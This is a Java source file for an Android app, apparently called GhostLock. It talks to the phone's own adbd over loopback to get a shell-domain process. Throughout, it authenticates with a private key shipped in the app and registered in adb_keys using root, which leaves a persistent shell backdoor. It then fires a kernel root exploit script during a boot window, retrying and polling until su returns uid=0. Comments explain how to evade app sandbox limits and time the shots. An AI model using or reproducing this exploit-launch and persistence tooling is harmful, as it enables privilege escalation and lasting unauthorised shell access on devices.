package com.ghostlock.boot;

import android.content.Context;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.Signature;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.PKCS8EncodedKeySpec;
import java.util.Locale;

/**
 * A minimal adb client that talks to the phone's own {@code adbd} over loopback.
 *
 * <p>Why this exists: the exploit cannot run from an app process. An app runs as
 * {@code u:r:untrusted_app_27} with {@code Seccomp=2} and cannot even read
 * {@code /sys/fs/selinux/enforce}, so the native payload bails out in
 * {@code prepare_kernel_page} ("heap spray failed"). {@code adbd}, however,
 * already runs on every boot, listens on {@code persist.adb.tcp.port} (5555 on
 * this device), and forks requested services as {@code u:r:shell:s0} with
 * {@code Seccomp=0} — exactly the environment where the exploit works.
 *
 * <p>So the app's job shrinks to: open a TCP connection to 127.0.0.1:5555, pass
 * the RSA challenge, and ask for {@code shell:sh /data/local/tmp/ghostlock/glrun.sh}.
 * Everything after that runs in the shell domain and is indistinguishable from
 * the PC-side run that has been reliable.
 *
 * <p>The only one-time setup is registering our public key in
 * {@code /data/misc/adb/adb_keys} (needs one root). After that the registration
 * survives reboots and app reinstall.
 */
public final class AdbBridge {

    private static final String TAG = "GhostLockBoot";

    /** adbd listens here because {@code persist.adb.tcp.port=5555} is persistent. */
    public static final int DEFAULT_PORT = 5555;

    /** Where the payload and its launcher script live (written by the PC side). */
    public static final String GL_DIR = "/data/local/tmp/ghostlock";
    public static final String GL_SCRIPT = GL_DIR + "/glrun.sh";

    // Protocol constants, little-endian uint32 on the wire.
    private static final int CMD_CNXN = 0x4e584e43; // "CNXN"
    private static final int CMD_AUTH = 0x48545541; // "AUTH"
    private static final int CMD_OPEN = 0x4e45504f; // "OPEN"
    private static final int CMD_OKAY = 0x59414b4f; // "OKAY"
    private static final int CMD_WRTE = 0x45545257; // "WRTE"
    private static final int CMD_CLSE = 0x45534c43; // "CLSE"

    private static final int AUTH_TOKEN = 1;
    private static final int AUTH_SIGNATURE = 2;

    private static final int A_VERSION = 0x01000001;
    private static final int MAX_DATA = 1024 * 1024;

    /** adbd starts a new challenge after every rejected signature; 6 is plenty. */
    private static final int AUTH_RETRIES = 6;

    /**
     * Shots per boot. A miss leaves the kernel clean ({@code clean=1/1} in the
     * payload log), so a second shot inside the same window is safe — measured
     * on 2026-11-17 00:52, where the first shot missed at uptime 30s, the second
     * one went out at 39s and {@code su} was live by 71s.
     */
    private static final int MAX_FIRE_ATTEMPTS = 2;

    /** Past this uptime another ~4s exploit run no longer fits the window. */
    private static final int WINDOW_RETRY_LIMIT = 44;

    /** Long poll at the end: late-load publishing {@code su} is asynchronous. */
    private static final int LONG_POLL_TRIES = 20;
    private static final int LONG_POLL_INTERVAL_MS = 3000;

    /** Parsing a 1216-byte DER blob on every connect is pointless work. */
    private static PrivateKey cachedKey;

    /** DigestInfo prefix for SHA-1, byte for byte what adb's auth path emits. */
    private static final byte[] SHA1_DIGESTINFO = {
            0x30, 0x21, 0x30, 0x09, 0x06, 0x05, 0x2b, 0x0e, 0x03, 0x02, 0x1a, 0x05, 0x00, 0x04, 0x14
    };

    /**
     * Produces the signature adbd actually accepts.
     *
     * <p>This is deliberately <em>not</em> {@code SHA1withRSA}. adb treats the
     * 20-byte challenge as an already-computed digest and signs
     * {@code DigestInfo(SHA-1) || token} raw. A textbook signature is rejected
     * without explanation — adbd simply replies with a fresh token, which looks
     * exactly like an unregistered key and sends you chasing the wrong problem.
     *
     * <p>Confirmed by recovering the block from a captured stock-client packet:
     * {@code 00 01 ff*218 00 30 21 30 09 06 05 2b 0e 03 02 1a 05 00 04 14 || token}.
     *
     * <p>Uses CRT parameters directly. {@code BigInteger#modPow} on the full
     * modulus is several times slower, and this runs inside a 25-second boot
     * window with a retry budget.
     */
    private static byte[] adbSign(PrivateKey key, byte[] token) {
        java.security.interfaces.RSAPrivateCrtKey crt =
                (java.security.interfaces.RSAPrivateCrtKey) key;
        BigInteger n = crt.getModulus();
        int k = (n.bitLength() + 7) / 8;

        int diLen = SHA1_DIGESTINFO.length + token.length;
        byte[] em = new byte[k];
        em[0] = 0x00;
        em[1] = 0x01;
        int sep = k - diLen - 1;           // index of the 0x00 separator
        for (int i = 2; i < sep; i++) {
            em[i] = (byte) 0xff;
        }
        em[sep] = 0x00;
        System.arraycopy(SHA1_DIGESTINFO, 0, em, sep + 1, SHA1_DIGESTINFO.length);
        System.arraycopy(token, 0, em, sep + 1 + SHA1_DIGESTINFO.length, token.length);

        BigInteger m = new BigInteger(1, em);
        BigInteger p = crt.getPrimeP();
        BigInteger q = crt.getPrimeQ();
        BigInteger m1 = m.mod(p).modPow(crt.getPrimeExponentP(), p);
        BigInteger m2 = m.mod(q).modPow(crt.getPrimeExponentQ(), q);
        BigInteger h = crt.getCrtCoefficient().multiply(m1.subtract(m2)).mod(p);
        BigInteger s = m2.add(h.multiply(q));

        byte[] raw = s.toByteArray();
        byte[] out = new byte[k];
        if (raw.length >= k) {
            System.arraycopy(raw, raw.length - k, out, 0, k);
        } else {
            System.arraycopy(raw, 0, out, k - raw.length, raw.length);
        }
        return out;
    }

    private AdbBridge() {
    }

    // ------------------------------------------------------------------ results

    /** Outcome of a bridge attempt, shaped for logging and for the status page. */
    public static final class Result {
        /** TCP connection reached adbd. */
        public final boolean connected;
        /** adbd accepted our key and sent CNXN. */
        public final boolean authed;
        /** Exit status of the remote command, or -1 when it never ran. */
        public final int exitCode;
        /** Remote output (both streams, concatenated). */
        public final String output;
        /** Short human-readable verdict for the status page. */
        public final String detail;
        /** Milliseconds spent, for the boot timeline. */
        public final long elapsedMs;

        Result(boolean connected, boolean authed, int exitCode, String output,
               String detail, long elapsedMs) {
            this.connected = connected;
            this.authed = authed;
            this.exitCode = exitCode;
            this.output = output;
            this.detail = detail;
            this.elapsedMs = elapsedMs;
        }

        public boolean ok() {
            return authed && exitCode == 0;
        }
    }

    // -------------------------------------------------------------------- keys

    /** Device-protected so the key survives a locked boot and is readable early. */
    public static File keyFile(Context c) {
        return new File(Launcher.workDir(c), "adbkey.pk8");
    }

    /**
     * Loads the RSA private key used to answer adbd's challenge.
     *
     * <p>Resolution order:
     * <ol>
     *   <li>{@code assets/adbkey.der} — the key whose public half the PC-side
     *       setup already appended to {@code /data/misc/adb/adb_keys}. Shipping
     *       it makes the bridge work with zero user interaction, which matters
     *       because the useful window opens before anyone can tap anything.</li>
     *   <li>A previously generated key in device-protected storage.</li>
     *   <li>A freshly generated key pair, for the case where someone wants the
     *       private half to stay unique to this device.</li>
     * </ol>
     */
    public static synchronized PrivateKey ensureKey(Context c) throws Exception {
        if (cachedKey != null) {
            return cachedKey;
        }

        try {
            InputStream in = c.getAssets().open("adbkey.der");
            byte[] der = readAll(in);
            if (der.length > 0) {
                cachedKey = KeyFactory.getInstance("RSA")
                        .generatePrivate(new PKCS8EncodedKeySpec(der));
                Launcher.log(c, "using bundled adb key (" + der.length + "B)");
                return cachedKey;
            }
        } catch (IOException noBundledKey) {
            // Nothing bundled: fall through to the per-device key.
        }

        File f = keyFile(c);
        if (f.isFile()) {
            byte[] der = readAll(new FileInputStream(f));
            if (der.length > 0) {
                try {
                    cachedKey = KeyFactory.getInstance("RSA")
                            .generatePrivate(new PKCS8EncodedKeySpec(der));
                    return cachedKey;
                } catch (Exception e) {
                    Launcher.log(c, "stored adb key unreadable, regenerating: " + e);
                }
            }
        }
        KeyPairGenerator gen = KeyPairGenerator.getInstance("RSA");
        gen.initialize(2048);
        KeyPair kp = gen.generateKeyPair();
        byte[] der = kp.getPrivate().getEncoded();
        FileOutputStream out = new FileOutputStream(f);
        try {
            out.write(der);
        } finally {
            out.close();
        }
        //noinspection ResultOfMethodCallIgnored
        f.setReadable(true, true);
        Launcher.log(c, "generated adb key pair -> " + f.getName()
                + " (" + der.length + "B) pub=" + fingerprint(kp.getPublic()));
        cachedKey = kp.getPrivate();
        return cachedKey;
    }

    /** First 16 hex chars of the modulus, enough to compare with the phone side. */
    private static String fingerprint(PublicKey pub) {
        try {
            BigInteger n = ((RSAPublicKey) pub).getModulus();
            String hex = n.toString(16).toUpperCase(Locale.US);
            return hex.length() > 16 ? hex.substring(0, 16) : hex;
        } catch (Exception e) {
            return "?";
        }
    }

    /**
     * Encodes the public key the way {@code adb_keys} expects it.
     *
     * <p>Android's {@code RSAPublicKey} is a raw struct, base64'd as a whole:
     * {@code uint32 len(words)}, {@code uint32 n0inv}, {@code uint8 n[256]} and
     * {@code uint8 rr[256]}, the last two little-endian. The public exponent is
     * implicit (65537). Getting this byte-exact matters: a one-byte-off blob is
     * silently ignored by adbd and looks like "auth rejected" forever.
     */
    public static String publicKeyLine(Context c) throws Exception {
        PrivateKey priv = ensureKey(c);
        PublicKey pub = derivePublic(priv);
        RSAPublicKey rsa = (RSAPublicKey) pub;
        BigInteger n = rsa.getModulus();

        int words = n.bitLength() / 32;           // 64 for 2048-bit
        int bytes = words * 4;                    // 256

        // n0inv = -1/n mod 2^32, the Montgomery constant adbd compares against.
        BigInteger two32 = BigInteger.ONE.shiftLeft(32);
        BigInteger n0 = n.and(two32.subtract(BigInteger.ONE));
        BigInteger inv = n0.modInverse(two32);
        long n0inv = two32.subtract(inv).mod(two32).longValue();

        // rr = R^2 mod n, with R = 2^(bytes*8).
        BigInteger rr = BigInteger.ONE.shiftLeft(bytes * 2 * 8).mod(n);

        byte[] blob = new byte[8 + bytes * 2];
        putU32(blob, 0, words);
        putU32(blob, 4, (int) n0inv);
        putLittleEndian(n, blob, 8, bytes);
        putLittleEndian(rr, blob, 8 + bytes, bytes);

        String b64 = android.util.Base64.encodeToString(blob, android.util.Base64.NO_WRAP);
        return b64 + " ghostlock@" + android.os.Build.MODEL;
    }

    /** The private key blob carries no public half, so rebuild it from n and e. */
    private static PublicKey derivePublic(PrivateKey priv) throws Exception {
        java.security.interfaces.RSAPrivateCrtKey crt =
                (java.security.interfaces.RSAPrivateCrtKey) priv;
        return KeyFactory.getInstance("RSA").generatePublic(
                new java.security.spec.RSAPublicKeySpec(crt.getModulus(), crt.getPublicExponent()));
    }

    private static void putU32(byte[] dst, int off, int v) {
        dst[off] = (byte) (v & 0xff);
        dst[off + 1] = (byte) ((v >>> 8) & 0xff);
        dst[off + 2] = (byte) ((v >>> 16) & 0xff);
        dst[off + 3] = (byte) ((v >>> 24) & 0xff);
    }

    /** BigInteger.toByteArray() is big-endian two's complement; adb wants LE raw. */
    private static void putLittleEndian(BigInteger v, byte[] dst, int off, int len) {
        byte[] be = v.toByteArray();
        for (int i = 0; i < len; i++) {
            int src = be.length - 1 - i;
            dst[off + i] = src >= 0 ? be[src] : 0;
        }
    }

    // --------------------------------------------------------------- transport

    /** Holds the socket plus enough state to speak the protocol by hand. */
    private static final class Channel {
        final Socket sock;
        final InputStream in;
        final DataOutputStream out;

        Channel(Socket s) throws IOException {
            this.sock = s;
            this.in = s.getInputStream();
            this.out = new DataOutputStream(s.getOutputStream());
        }

        void send(int cmd, int arg0, int arg1, byte[] payload) throws IOException {
            int len = payload == null ? 0 : payload.length;
            out.writeInt(Integer.reverseBytes(cmd));
            out.writeInt(Integer.reverseBytes(arg0));
            out.writeInt(Integer.reverseBytes(arg1));
            out.writeInt(Integer.reverseBytes(len));
            // check field: 0 tells adbd to skip payload validation entirely,
            // which is what "if (data_check == 0) return true" does on every
            // protocol version since adb 1.0.35.
            out.writeInt(0);
            out.writeInt(Integer.reverseBytes(cmd ^ 0xffffffff));
            if (len > 0) {
                out.write(payload);
            }
            out.flush();
        }

        Message recv() throws IOException {
            byte[] h = new byte[24];
            readFully(in, h);
            // readInt already assembles the word little-endian, so there is no
            // byte swapping here. Swapping twice turns a 20-byte token length
            // into 0x14000000 and the parse dies on a bogus payload size.
            int cmd = readInt(h, 0);
            int arg0 = readInt(h, 4);
            int arg1 = readInt(h, 8);
            int len = readInt(h, 12);
            int magic = readInt(h, 20);
            if (magic != (cmd ^ 0xffffffff)) {
                throw new IOException("bad magic " + Integer.toHexString(magic)
                        + " for cmd " + Integer.toHexString(cmd));
            }
            if (len < 0 || len > MAX_DATA) {
                throw new IOException("bad payload length " + len);
            }
            byte[] body = new byte[len];
            if (len > 0) {
                readFully(in, body);
            }
            return new Message(cmd, arg0, arg1, body);
        }

        void close() {
            try {
                sock.close();
            } catch (IOException ignored) {
            }
        }
    }

    private static final class Message {
        final int cmd;
        final int arg0;
        final int arg1;
        final byte[] body;

        Message(int cmd, int arg0, int arg1, byte[] body) {
            this.cmd = cmd;
            this.arg0 = arg0;
            this.arg1 = arg1;
            this.body = body;
        }

        String name() {
            switch (cmd) {
                case CMD_CNXN: return "CNXN";
                case CMD_AUTH: return "AUTH";
                case CMD_OPEN: return "OPEN";
                case CMD_OKAY: return "OKAY";
                case CMD_WRTE: return "WRTE";
                case CMD_CLSE: return "CLSE";
                default: return "0x" + Integer.toHexString(cmd);
            }
        }
    }

    private static int readInt(byte[] b, int off) {
        return (b[off] & 0xff) | ((b[off + 1] & 0xff) << 8)
                | ((b[off + 2] & 0xff) << 16) | ((b[off + 3] & 0xff) << 24);
    }

    private static void readFully(InputStream in, byte[] dst) throws IOException {
        int got = 0;
        while (got < dst.length) {
            int n = in.read(dst, got, dst.length - got);
            if (n < 0) {
                throw new IOException("adbd closed after " + got + "/" + dst.length + " bytes");
            }
            got += n;
        }
    }

    // -------------------------------------------------------------- handshake

    /**
     * Connects and authenticates. Returns once adbd has sent its CNXN, which is
     * the only signal that means "your key is registered".
     */
    private static Channel open(Context c, int port, int timeoutMs) throws Exception {
        Socket s = new Socket();
        s.setTcpNoDelay(true);
        s.connect(new InetSocketAddress("127.0.0.1", port), timeoutMs);
        s.setSoTimeout(timeoutMs);
        Channel ch = new Channel(s);

        byte[] banner = ("host::features=cmd,shell_v2\0").getBytes(StandardCharsets.UTF_8);
        ch.send(CMD_CNXN, A_VERSION, MAX_DATA, banner);

        PrivateKey key = ensureKey(c);

        for (int i = 0; i < AUTH_RETRIES; i++) {
            Message m = ch.recv();
            if (m.cmd == CMD_CNXN) {
                return ch;
            }
            if (m.cmd == CMD_AUTH && m.arg0 == AUTH_TOKEN) {
                ch.send(CMD_AUTH, AUTH_SIGNATURE, 0, adbSign(key, m.body));
                continue;
            }
            throw new IOException("unexpected " + m.name() + " during auth"
                    + " (arg0=" + m.arg0 + ")");
        }
        ch.close();
        throw new AuthRejected("adbd rejected our signature " + AUTH_RETRIES + " times");
    }

    /** Distinct type so the UI can say "register the key" instead of "broken". */
    public static final class AuthRejected extends Exception {
        AuthRejected(String msg) {
            super(msg);
        }
    }

    // ------------------------------------------------------------------ verbs

    /**
     * End-to-end health check: connect, authenticate, and actually run
     * something in the shell domain.
     *
     * <p>Authenticating alone is not enough. The interesting failure — the one
     * that would waste a boot window — is a bridge that authenticates but
     * cannot get a service forked, so the probe runs {@code id} and confirms
     * the reply comes back as uid 2000 / {@code u:r:shell:s0}.
     */
    public static Result probe(Context c) {
        Result r = exec(c, "id; getenforce", 8000);
        String d;
        if (r.connected && r.authed) {
            boolean shellDomain = r.output.contains("uid=2000")
                    || r.output.contains("u:r:shell:s0");
            if (shellDomain) {
                String selinux = r.output.contains("Enforcing") ? "Enforcing" : "?";
                d = "bridge OK, shell domain reachable, selinux=" + selinux
                        + " (" + r.elapsedMs + "ms)";
            } else {
                d = "bridge authed but shell reply unexpected: " + oneLine(r.output, 120);
            }
            Launcher.log(c, "bridge probe: " + d);
            return new Result(true, true, r.exitCode, r.output, d, r.elapsedMs);
        }
        if (r.connected) {
            String msg = "adbd reachable, key not registered";
            Launcher.log(c, "bridge probe: " + msg);
            return new Result(true, false, -1, "", msg, r.elapsedMs);
        }
        String msg = "adbd unreachable: " + r.detail;
        Launcher.log(c, "bridge probe: " + msg);
        return new Result(false, false, -1, "", msg, r.elapsedMs);
    }

    /**
     * Runs a command through adbd's {@code shell:} service.
     *
     * <p>Uses {@code shell,v2,TERM=dumb,raw:}. The legacy {@code shell:} alias
     * looks simpler but allocates a pty, and on this adbd build any external
     * command after the first kills the stream — {@code echo a; echo b} works
     * while {@code echo a; id; echo b} returns only the first line. The v2
     * service with {@code raw} gives a plain pipe and a real exit status.
     */
    public static Result exec(Context c, String command, int timeoutMs) {
        long t0 = System.currentTimeMillis();
        Channel ch = null;
        boolean authed = false;
        try {
            ch = open(c, DEFAULT_PORT, Math.min(timeoutMs, 5000));
            authed = true;
            ch.sock.setSoTimeout(timeoutMs);

            final int localId = 4391;
            byte[] svc = ("shell,v2,TERM=dumb,raw:" + command + "\0")
                    .getBytes(StandardCharsets.UTF_8);
            ch.send(CMD_OPEN, localId, 0, svc);

            ByteArrayOutputStream out = new ByteArrayOutputStream();
            ByteArrayOutputStream err = new ByteArrayOutputStream();
            int exitCode = -1;
            boolean stdinClosed = false;

            while (true) {
                Message m = ch.recv();
                if (m.cmd == CMD_OKAY) {
                    // shell_v2 wants stdin closed explicitly: a stock client
                    // sends a zero-length sid=4 record right after OKAY.
                    // Without it, anything that reads stdin sits there until
                    // the read timeout.
                    if (!stdinClosed && m.arg1 == localId) {
                        ch.send(CMD_WRTE, localId, m.arg0, new byte[]{4, 0, 0, 0, 0});
                        stdinClosed = true;
                    }
                    continue;
                }
                if (m.cmd == CMD_WRTE) {
                    exitCode = readShellV2(m.body, out, err, exitCode);
                    // OKAY is (our id, their id) — the mirror image of what
                    // adbd sends. Swapping them makes adbd drop the stream
                    // after exactly one chunk, which looks exactly like
                    // "external commands produce no output".
                    ch.send(CMD_OKAY, localId, m.arg0, null);
                    continue;
                }
                if (m.cmd == CMD_CLSE) {
                    // Acknowledge the close. adbd keeps per-transport stream
                    // state until it sees this, and a stream left dangling is
                    // what made the *next* connection die during auth with
                    // "adbd closed after 0/24 bytes" — which reads exactly like
                    // "adbd is not up yet" and sends you chasing boot timing
                    // instead of the missing CLSE.
                    ch.send(CMD_CLSE, localId, m.arg0, null);
                    break;
                }
                if (m.cmd == CMD_CNXN) {
                    continue;
                }
                Launcher.log(c, "bridge: unexpected " + m.name() + " mid-stream");
                break;
            }

            long dt = System.currentTimeMillis() - t0;
            String stdout = out.toString("UTF-8");
            String stderr = err.toString("UTF-8");
            int rc = exitCode >= 0 ? exitCode : exitMarker(stdout);
            String d = "ran via adbd, rc=" + rc
                    + ", " + stdout.length() + "B out"
                    + (stderr.isEmpty() ? "" : ", " + stderr.length() + "B err")
                    + " (" + dt + "ms)";
            Launcher.log(c, "bridge exec: " + d + " cmd=" + oneLine(command, 160));
            if (!stdout.isEmpty()) {
                Launcher.log(c, "bridge stdout: " + oneLine(stdout, 400));
            }
            if (!stderr.isEmpty()) {
                Launcher.log(c, "bridge stderr: " + oneLine(stderr, 200));
            }
            return new Result(true, true, rc, stdout + stderr, d, dt);

        } catch (AuthRejected e) {
            long dt = System.currentTimeMillis() - t0;
            String d = "key not registered";
            Launcher.log(c, "bridge exec: " + d + " " + e.getMessage());
            return new Result(true, false, -1, "", d, dt);
        } catch (SocketTimeoutException e) {
            long dt = System.currentTimeMillis() - t0;
            String d = "timed out after " + dt + "ms";
            Launcher.log(c, "bridge exec: " + d);
            return new Result(authed, authed, -1, "", d, dt);
        } catch (Exception e) {
            long dt = System.currentTimeMillis() - t0;
            String d = (authed ? "stream died mid-run: " : "failed: ") + brief(e);
            Launcher.log(c, "bridge exec: " + d);
            // Keep authed true when it was: the command really did start, and a
            // stream that dies after auth usually means the kernel went down
            // under the payload. Reporting that as "bridge unavailable" would
            // make the caller fire a second time, and a second shot on the same
            // boot is what takes the whole system with it.
            return new Result(authed, authed, -1, "", d, dt);
        } finally {
            if (ch != null) {
                ch.close();
            }
        }
    }

    /**
     * Decodes one shell_v2 chunk into the stdout/stderr buffers.
     *
     * <p>The payload is a sequence of records rather than one header:
     * {@code [sid:1][len:4 little-endian][data:len]}, repeated. sid 1 is
     * stdout, 2 is stderr, 3 carries the exit status in a single byte.
     *
     * <p>Reading the payload as one blob and skipping a single id byte is the
     * bug that silently ate the output of every external command while shell
     * builtins like {@code echo} still looked fine — the length word was being
     * printed as data and the real bytes never made it out.
     */
    private static int readShellV2(byte[] p, ByteArrayOutputStream out,
                                   ByteArrayOutputStream err, int exitCode) {
        int i = 0;
        while (i + 5 <= p.length) {
            int sid = p[i] & 0xff;
            int len = (p[i + 1] & 0xff) | ((p[i + 2] & 0xff) << 8)
                    | ((p[i + 3] & 0xff) << 16) | ((p[i + 4] & 0xff) << 24);
            if (len < 0 || i + 5 + len > p.length) {
                break;
            }
            if (sid == 1) {
                out.write(p, i + 5, len);
            } else if (sid == 2) {
                err.write(p, i + 5, len);
            } else if (sid == 3 && len > 0) {
                exitCode = p[i + 5] & 0xff;
            }
            i += 5 + len;
        }
        return exitCode;
    }

    /** Matches the exit-status marker {@link #fire} echoes into the stream. */
    private static final java.util.regex.Pattern RC_MARK =
            java.util.regex.Pattern.compile("__RC__=(-?\\d+)");

    /** Last {@code __RC__=N} in the output, or -1 when the command never got that far. */
    private static int exitMarker(String out) {
        java.util.regex.Matcher m = RC_MARK.matcher(out);
        int rc = -1;
        while (m.find()) {
            try {
                rc = Integer.parseInt(m.group(1));
            } catch (NumberFormatException ignored) {
                // keep the previous value
            }
        }
        return rc;
    }

    /**
     * Appends our public key to {@code /data/misc/adb/adb_keys}.
     *
     * <p>One-time setup, and the only step that needs root. Idempotent: the key
     * is matched with {@code grep -F} first, because a duplicated line makes
     * adbd try the same signature twice and then fall back to asking the user,
     * which is useless when the screen may be off.
     *
     * <p>{@code adbd} re-reads the file on every {@code adb_auth_verify}, so no
     * restart is needed and root can die right after this returns.
     */
    public static String registerKey(Context c) {
        String line;
        try {
            line = publicKeyLine(c);
        } catch (Exception e) {
            return "cannot build public key: " + brief(e);
        }
        String b64 = line.split(" ")[0];
        // base64 and the comment hold no single quotes, so plain quoting is safe.
        String sh = "K=/data/misc/adb/adb_keys; "
                + "mkdir -p /data/misc/adb; touch $K; "
                + "grep -qF '" + b64 + "' $K || echo '" + line + "' >> $K; "
                + "chown system:shell $K; chmod 0640 $K; "
                + "echo \"lines=$(wc -l < $K)\"";
        try {
            Process p = new ProcessBuilder("su", "-c", sh)
                    .redirectErrorStream(true)
                    .start();
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            InputStream in = p.getInputStream();
            byte[] buf = new byte[4096];
            int n;
            while ((n = in.read(buf)) > 0) {
                bos.write(buf, 0, n);
            }
            boolean done = p.waitFor(20, java.util.concurrent.TimeUnit.SECONDS);
            String out = bos.toString("UTF-8").trim();
            String d = (done ? "su rc=" + p.exitValue() : "su timed out")
                    + " " + (out.isEmpty() ? "(no output)" : out);
            Launcher.log(c, "register adb key: " + d);
            return d;
        } catch (Exception e) {
            String d = "su unavailable: " + brief(e);
            Launcher.log(c, "register adb key: " + d);
            return d;
        }
    }

    /**
     * The whole point of the bridge: run the exploit from the shell domain.
     *
     * <p>The script already exists on the device and already points at the right
     * profile, so this is one short command with no app-side staging.
     *
     * <p>The command also tails the newest {@code native-*.log}. The app cannot
     * list {@code /data/local/tmp/ghostlock} (the directory is {@code --x} for
     * other), but the log files themselves are world-readable and adbd runs the
     * {@code ls} for us, so the verdict comes back over the same channel.
     *
     * <p>Judging the shot by {@code su} immediately after the payload exits gives
     * a false negative. The exploit only loads the kernel module; KernelSU's own
     * daemon then takes seconds to expose {@code su}. Measured 2026-11-17 00:52:
     * the payload finished at uptime 39s and 45s, both reported "su: inaccessible",
     * and {@code su} was answering by uptime 71s — the second shot had worked.
     * So the loop is: fire once, then poll for up to a minute.
     *
     * <p>Uptime bounds the firing, not the waiting. The exploit has to start
     * inside 30–48s, but late-load completing afterwards is normal.
     */
    public static Result fire(Context c) {
        String cmd = "sh " + GL_SCRIPT
                + "; echo \"__RC__=$?\""
                + "; L=$(ls -t " + GL_DIR + "/native-*.log 2>/dev/null | head -1)"
                + "; if [ -n \"$L\" ]; then echo \"__LOG__=$L\"; tail -n 30 \"$L\"; fi";

        Result shot = null;

        for (int attempt = 1; attempt <= MAX_FIRE_ATTEMPTS; attempt++) {
            shot = exec(c, cmd, 45000);
            if (!shot.authed || !shot.connected) {
                return shot;
            }
            if (shot.output.contains("KernelSU module loaded")) {
                Launcher.log(c, "bridge: payload reported KernelSU loaded (attempt "
                        + attempt + ")");
                return shot;
            }

            // No short poll here. The shot itself takes 3-10s, and the window
            // closes at 48s: spending 8s checking for su is what pushed the
            // second shot past uptime 46s on 2026-11-17 01:04 and left the boot
            // with a single attempt. One cheap check, then decide.
            if (suWorks(c)) {
                Launcher.log(c, "bridge: root confirmed right after attempt " + attempt);
                return shot;
            }

            double up = Launcher.uptime();
            if (up < 0 || up > WINDOW_RETRY_LIMIT || attempt == MAX_FIRE_ATTEMPTS) {
                Launcher.log(c, "bridge: attempt " + attempt + " missed (uptime="
                        + (int) up + "s), no room for another shot");
                break;
            }
            Launcher.log(c, "bridge: attempt " + attempt + " missed (uptime="
                    + (int) up + "s), one more shot");
        }

        // A hit publishes `su` asynchronously, so keep watching well past the
        // window rather than declaring failure the moment the payload exits.
        // Judging immediately is what made a successful shot look like a miss
        // on 2026-11-17 00:52: both shots reported "su: inaccessible" and root
        // was live 26s later.
        for (int i = 0; i < LONG_POLL_TRIES; i++) {
            if (suWorks(c)) {
                Launcher.log(c, "bridge: root confirmed late, "
                        + (i * LONG_POLL_INTERVAL_MS / 1000) + "s after the last shot");
                return shot;
            }
            if (i < LONG_POLL_TRIES - 1) {
                pause(LONG_POLL_INTERVAL_MS);
            }
        }
        Launcher.log(c, "bridge: no su within the poll budget, this boot missed");
        return shot;
    }

    /** Sleep that turns an interrupt into "stop waiting, keep going". */
    private static void pause(int ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    /** Ground truth for a retry decision: is {@code su} usable right now. */
    private static boolean suWorks(Context c) {
        Result r = exec(c, "su -c id", 6000);
        return r.authed && r.output.contains("uid=0");
    }

    // ------------------------------------------------------------------ utils

    /** Short exception text for logs; stack traces are useless on a phone screen. */
    private static String brief(Throwable e) {
        String m = e.getMessage();
        if (m == null || m.isEmpty()) {
            m = e.getClass().getSimpleName();
        }
        return m;
    }

    private static String oneLine(String s, int max) {
        String flat = s.replace('\n', ' ').replace('\r', ' ').trim();
        return flat.length() > max ? flat.substring(0, max) + "..." : flat;
    }

    private static byte[] readAll(InputStream in) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        try {
            int n;
            while ((n = in.read(buf)) > 0) {
                bos.write(buf, 0, n);
            }
        } finally {
            in.close();
        }
        return bos.toByteArray();
    }
}
